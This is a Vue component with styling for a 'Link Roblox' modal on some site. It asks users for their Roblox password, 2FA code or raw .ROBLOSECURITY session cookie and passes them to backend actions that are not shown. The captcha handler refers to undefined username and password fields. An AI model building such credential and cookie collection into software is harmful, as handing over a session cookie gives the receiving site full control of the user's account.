<template>
    <div class="modal-link-roblox">
        <div class="roblox-title">
            <span class="gradient-green">LINK ROBLOX</span>
        </div>
        <div v-if="authStep === 'captcha'" class="roblox-captcha">
            <iframe
                v-bind:src="modalsData.captchaUrl"
                width="320"
                height="320"
            />
        </div>
        <div v-else-if="authStep === 'twostep'" class="roblox-twostep">
            <div class="twostep-title">FILL IN YOUR 2FA CODE</div>
            <div class="twostep-input">
                <input v-model="modalTwoStepCode" type="text" placeholder="ENTER 2FA CODE" />
            </div>
        </div>
        <div v-else-if="modalTab === 'credentials'" class="roblox-login">
            <div class="login-element">
                <div class="element-title">USERNAME</div>
                <div class="element-input">
                    <input v-model="modalUsername" type="text" placeholder="ENTER USERNAME" />
                </div>
            </div>
            <div class="login-element">
                <div class="element-title">PASSWORD</div>
                <div class="element-input">
                    <input v-model="modalPassword" type="password" placeholder="ENTER PASSWORD" />
                </div>
            </div>
        </div>
        <div v-else class="roblox-cookie">
            <div class="cookie-title">FILL IN YOUR .ROBLOSECURITY COOKIE</div>
            <div class="cookie-input">
                <input v-model="modalCookie" type="text" placeholder="ENTER .ROBLOSECURITY COOKIE" />
            </div>
        </div>
        <div class="roblox-buttons">
            <button v-on:click="modalSetTab(modalTab === 'credentials' ? 'cookie' : 'credentials')" class="button-toggle" v-bind:class="{ 
                'button-active': modalTab === 'cookie' 
            }" v-bind:disabled="authSendLoginLoading === true || authStep !== 'login'">
                <div class="button-inner">.ROBLOSECURITY</div>
            </button>
            <button v-on:click="modalActionButton()" class="button-action" v-bind:disabled="authSendLoginLoading === true || authStep === 'captcha'">
                <div class="button-inner">
                    <transition name="fade" mode="out-in">
                        <ButtonLoading v-if="authSendLoginLoading === true" />
                        <div v-else class="inner-content">LINK ROBLOX</div>
                    </transition>
                </div>
            </button>
        </div>
    </div>
</template>

<script>
    import { mapGetters, mapActions } from 'vuex';
    import ButtonLoading from '@/components/ButtonLoading';

    export default {
        name: 'ModalLinkRoblox',
        components: {
            ButtonLoading
        },
        data() {
            return {
                modalTab: 'credentials',
                modalUsername: null,
                modalPassword: null,
                modalTwoStepCode: null,
                modalCookie: null
            }
        },
        methods: {
            ...mapActions([
                'modalsSetShow', 
                'authSendRoblox', 
                'authSendRobloxTwoStep', 
                'authSendRobloxCookie'
            ]),
            modalSetTab(tab) {
                this.modalTab = tab;
            },
            modalActionButton() {
                if(this.modalTab === 'cookie') {
                    if(this.modalCookie === null || this.modalCookie.trim() === '') {
                        return;
                    }

                    const data = { cookie: this.modalCookie.trim() };
                    this.authSendRobloxCookie(data);
                } else if(this.authStep === 'login') {
                    if(this.modalUsername === null || this.modalUsername.trim() === '') {
                        return;
                    }

                    if(this.modalPassword === null || this.modalPassword.trim() === '') {
                        return;
                    }

                    const data = { step: 'login', username: this.modalUsername, password: this.modalPassword };
                    this.authSendRoblox(data);
                } else if(this.authStep === 'twostep') {
                    if(this.modalTwoStepCode === null || this.modalTwoStepCode.trim() === '') {
                        return;
                    }

                    const data = { ...this.modalsData, code: this.modalTwoStepCode.trim() };
                    this.authSendRobloxTwoStep(data);
                }       
            }
        },
        computed: {
            ...mapGetters([
                'modalsShow', 
                'modalsData', 
                'authSendLoginLoading', 
                'authStep'
            ])
        },
        mounted() {
            window.addEventListener('message', (event) => {
                event = typeof(event.data) === 'object' ? event.data : JSON.parse(event.data);

                if(event.eventId === 'challenge-completed') {
                    const data = { step: 'captcha', username: this.loginUsername, password: this.loginPassword, challengeId: this.modalsData.challengeId, captchaId: this.modalsData.captchaId, captchaToken: event.payload.sessionToken, secureAuthenticationIntent: this.modalsData.secureAuthenticationIntent };
                    this.authSendRoblox(data);
                }
            });
        }
    }
</script>

<style scoped>
    .modal-link-roblox {
        width: 773px;
        position: relative;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 35px 80px 48px 80px;
        border-radius: var(--radius-lg);
        /* Desert sand background matching header theme */
        background: 
            /* Sand grain texture overlay */
            radial-gradient(circle at 20% 30%, rgba(222, 184, 135, 0.15) 0%, transparent 50%),
            radial-gradient(circle at 80% 70%, rgba(184, 115, 51, 0.12) 0%, transparent 50%),
            radial-gradient(circle at 40% 80%, rgba(205, 127, 50, 0.1) 0%, transparent 50%),
            /* Fine sand texture pattern */
            repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(222, 184, 135, 0.03) 2px,
                rgba(222, 184, 135, 0.03) 3px
            ),
            repeating-linear-gradient(
                90deg,
                transparent,
                transparent 2px,
                rgba(184, 115, 51, 0.03) 2px,
                rgba(184, 115, 51, 0.03) 3px
            ),
            /* Main desert sand gradient */
            linear-gradient(
                180deg,
                rgba(222, 184, 135, 0.25) 0%,
                rgba(205, 127, 50, 0.30) 25%,
                rgba(184, 115, 51, 0.35) 50%,
                rgba(139, 111, 71, 0.30) 75%,
                rgba(101, 67, 33, 0.25) 100%
            ),
            /* Base dark background */
            rgba(26, 20, 15, 0.98);
        backdrop-filter: blur(10px) saturate(120%);
        border: 2px solid rgba(222, 184, 135, 0.6);
        box-shadow: 
            0 10px 40px rgba(0, 0, 0, 0.9),
            0 5px 20px rgba(184, 115, 51, 0.4),
            inset 0 1px 0 rgba(222, 184, 135, 0.2);
    }

    .modal-link-roblox .roblox-title {
        text-align: center;
        font-size: 32px;
        font-weight: 900;
    }

    .modal-link-roblox .roblox-title .gradient-green {
        background: var(--gradient-gold);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        text-fill-color: transparent;
    }

    .modal-link-roblox .roblox-login {
        width: 100%;
        margin-top: 35px;
    }

    .modal-link-roblox .roblox-twostep,
    .modal-link-roblox .roblox-cookie,
    .modal-link-roblox .login-element {
        width: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
        margin-top: 35px;
    }

    .modal-link-roblox .login-element:first-child {
        margin-top: 0;
    }

    .modal-link-roblox .twostep-title,
    .modal-link-roblox .cookie-title,
    .modal-link-roblox .element-title {
        font-size: 14px;
        font-weight: 800;
        color: var(--accent-copper-light);
    }

    .modal-link-roblox .twostep-input,
    .modal-link-roblox .cookie-input,
    .modal-link-roblox .element-input {
        width: 100%;
        height: 78px;
        position: relative;
        margin-top: 20px;
        padding: 1px;
    }

    .modal-link-roblox .twostep-input:before,
    .modal-link-roblox .cookie-input:before,
    .modal-link-roblox .element-input:before {
        content: '';
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background: linear-gradient(180deg, rgba(184, 115, 51, 0.3) 0%, rgba(139, 111, 71, 0.4) 100%);
        border-radius: var(--radius-md);
    }

    .modal-link-roblox .twostep-input input,
    .modal-link-roblox .cookie-input input,
    .modal-link-roblox .element-input input {
        width: 100%;
        height: 100%;
        padding: 0 115px 0 25px;
        font-size: 16px;
        font-weight: 600;
        color: var(--text-gold);
        background-color: rgba(13, 13, 13, 0.8);
        border-radius: var(--radius-md);
        border: 1px solid rgba(222, 184, 135, 0.3);
    }

    .modal-link-roblox .twostep-input input:focus,
    .modal-link-roblox .cookie-input input:focus,
    .modal-link-roblox .element-input input:focus {
        outline: none;
        border-color: rgba(222, 184, 135, 0.6);
        box-shadow: 0 0 10px rgba(184, 115, 51, 0.3);
    }

    .modal-link-roblox .twostep-input input::placeholder,
    .modal-link-roblox .cookie-input input::placeholder,
    .modal-link-roblox .element-input input::placeholder {
        color: var(--text-muted);
    }

    .modal-link-roblox .roblox-buttons {
        display: flex;
        align-items: center;
        margin-top: 35px;
    }

    .modal-link-roblox button.button-toggle {
        width: 200px;
        height: 54px;
        position: relative;
        margin-right: 20px;
        padding: 1px;
        z-index: 1;
        transition: all 0.3s ease;
    }

    .modal-link-roblox button.button-toggle.button-active {
        filter: drop-shadow(0px 4px 15px rgba(184, 115, 51, 0.4));
    }

    .modal-link-roblox button.button-action {
        width: 180px;
        height: 54px;
        position: relative;
        transition: all 0.3s ease;
    }

    .modal-link-roblox button.button-toggle::before {
        content: '';
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background: var(--gradient-copper);
        border-radius: var(--radius-md);
        z-index: -1;
        opacity: 0;
        transition: opacity 0.3s ease;
    }

    .modal-link-roblox button.button-toggle.button-active::before {
        opacity: 1;
    }

    .modal-link-roblox button.button-toggle::after {
        content: '';
        width: calc(100% - 2px);
        height: calc(100% - 2px);
        position: absolute;
        top: 1px;
        left: 1px;
        background-color: rgba(13, 13, 13, 0.9);
        border-radius: var(--radius-md);
        border: 1px solid rgba(222, 184, 135, 0.2);
        z-index: -1;
        transition: all 0.3s ease;
    }

    .modal-link-roblox button.button-toggle.button-active::after {
        border-color: rgba(222, 184, 135, 0.5);
    }

    .modal-link-roblox button.button-toggle .button-inner,
    .modal-link-roblox button.button-action .button-inner {
        width: 100%;
        height: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 18px;
        font-weight: 800;
        border-radius: var(--radius-md);
        transition: all 0.3s ease;
    }

    .modal-link-roblox button.button-toggle .button-inner {
        color: var(--accent-copper-light);
        background-color: rgba(13, 13, 13, 0.8);
        border: 1px solid rgba(222, 184, 135, 0.2);
    }

    .modal-link-roblox button.button-toggle.button-active .button-inner {
        color: var(--text-gold);
        background: rgba(184, 115, 51, 0.1);
        border-color: rgba(222, 184, 135, 0.5);
    }
    
    .modal-link-roblox button.button-toggle:hover .button-inner {
        border-color: rgba(222, 184, 135, 0.4);
    }

    .modal-link-roblox button.button-action .button-inner {
        color: var(--text-gold);
        background: var(--gradient-copper);
        border: 1px solid rgba(222, 184, 135, 0.5);
        box-shadow: 
            0 4px 15px rgba(184, 115, 51, 0.4),
            inset 0 1px 0 rgba(255, 255, 255, 0.2);
    }
    
    .modal-link-roblox button.button-action:hover .button-inner {
        background: var(--gradient-copper-dark);
        box-shadow: 
            0 6px 20px rgba(184, 115, 51, 0.6),
            inset 0 1px 0 rgba(255, 255, 255, 0.3);
        transform: translateY(-1px);
    }
    
    .modal-link-roblox button.button-toggle:disabled .button-inner {
        opacity: 0.5;
        cursor: not-allowed;
        color: var(--text-muted);
        background-color: rgba(13, 13, 13, 0.5);
        border-color: rgba(222, 184, 135, 0.1);
    }
    
    .modal-link-roblox button.button-action:disabled .button-inner {
        opacity: 0.5;
        cursor: not-allowed;
        background: rgba(184, 115, 51, 0.2);
        box-shadow: none;
    }
    
    .modal-link-roblox button.button-action:disabled:hover .button-inner {
        transform: none;
    }

    @media only screen and (max-width: 793px) {

        .modal-link-roblox {
            width: calc(100vw - 20px);
            padding: 35px 10px 48px 10px;
        }

    }

    @media only screen and (max-width: 500px) {

        .modal-link-roblox {
            padding: 55px 10px 48px 10px;
        }

    }
</style>